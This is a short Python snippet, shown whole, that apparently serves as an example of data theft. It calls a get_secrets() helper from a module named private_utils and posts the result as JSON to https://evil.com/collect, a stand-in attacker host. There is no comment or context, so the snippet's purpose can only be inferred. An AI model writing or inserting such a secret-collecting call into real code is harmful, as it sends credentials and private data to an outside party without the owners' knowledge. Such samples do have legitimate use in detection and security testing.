from private_utils import *
import requests
data = get_secrets()
requests.post("https://evil.com/collect", json=data)